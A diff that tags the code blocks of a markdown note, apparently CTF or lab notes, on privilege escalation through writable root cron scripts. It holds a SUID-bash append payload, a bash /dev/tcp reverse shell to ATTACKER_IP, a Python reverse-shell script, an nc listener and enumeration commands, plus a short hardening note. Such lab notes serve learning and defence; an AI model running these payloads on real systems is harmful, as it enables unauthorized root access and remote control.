@@ -22,12 +22,14 @@ root crontab  /opt/admin_stuff/script.sh (every minute)
 ## Steps
 
 ### 1. Identify group membership
+<!-- cmd: linux -->
 ```bash
 id
 # groups=...,1003(editors)
 ```
 
 ### 2. Find group-writable files
+<!-- cmd: linux -->
 ```bash
 find / -group admin 2>/dev/null
 find / -group editors 2>/dev/null
@@ -36,6 +38,7 @@ find / -group editors 2>/dev/null
 **Key file:** `/usr/local/bin/main_backup.sh`
 
 ### 3. Confirm the cron chain
+<!-- cmd: linux -->
 ```bash
 cat /opt/admin_stuff/script.sh
 # #I have set a cronjob to run this script every minute
@@ -43,11 +46,13 @@ cat /opt/admin_stuff/script.sh
 ```
 
 ### 4. Append SUID bash payload
+<!-- cmd: linux -->
 ```bash
 echo "cp /bin/bash /tmp/custom && chmod u+s /tmp/custom" >> /usr/local/bin/main_backup.sh
 ```
 
 ### 5. Wait up to one minute, then spawn root shell
+<!-- cmd: linux -->
 ```bash
 /tmp/custom -p
 whoami
@@ -58,12 +63,14 @@ whoami
 
 ## Alternative — Reverse Shell Payload
 
+<!-- cmd: linux -->
 ```bash
 echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /usr/local/bin/main_backup.sh
 ```
 
 ## Variant — Root cron runs a user-owned script (bsidesgtdevelpy)
 
+<!-- cmd: linux -->
 ```bash
 cat /etc/crontab
 # *  *    * * *   root    cd /root/company && bash run.sh
@@ -71,6 +78,7 @@ cat /etc/crontab
 ```
 
 Looks fine — until you read `run.sh`:
+<!-- cmd: linux -->
 ```bash
 cat /home/king/run.sh
 # socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &
@@ -78,6 +86,7 @@ cat /home/king/run.sh
 
 `run.sh` lives in king's home and is **owned by king**, but `/etc/crontab` also schedules `root` to `cd /root/company && bash run.sh`. **You don't need to write the root-side cron script** — you just need to write the file the root-side script `python /root/company/media/*.py` glob pulls in:
 
+<!-- cmd: linux -->
 ```bash
 cat /root/company/run.sh
 # python /root/company/media/*.py      wildcard glob == attacker-controlled
@@ -85,6 +94,7 @@ cat /root/company/run.sh
 
 So drop a `.py` into `/root/company/media/` (via a sibling write — bsidesgtdevelpy's foothold was a webapp upload that landed there), wait for the cron tick, get a root reverse shell.
 
+<!-- cmd: python -->
 ```python
 # attack.py — dropped into /root/company/media/
 import socket,subprocess,os
@@ -94,6 +104,7 @@ s.connect(("$LHOST", 1337))
 subprocess.call(["/bin/sh", "-i"])
 ```
 
+<!-- cmd: linux -->
 ```bash
 # Listener
 nc -lvnp 1337
@@ -116,6 +127,7 @@ See <https://gtfobins.org/> for `tar`, `find`, `chown`, `chmod` wildcard-injecti
 
 ## How to Find It
 
+<!-- cmd: linux -->
 ```bash
 cat /etc/crontab                                # [USED — Team, bsidesgtdevelpy]
 ls -la /etc/cron.d/ /etc/cron.*                 # [USED — CCTV, Team]
@@ -140,6 +152,7 @@ For every cron that runs as root, ask:
 ## Defensive Note
 
 Cron scripts run as root must be owned and writable only by root, **and any file they invoke must be likewise locked down**:
+<!-- cmd: linux -->
 ```bash
 chmod 700 /usr/local/bin/main_backup.sh
 chown root:root /usr/local/bin/main_backup.sh
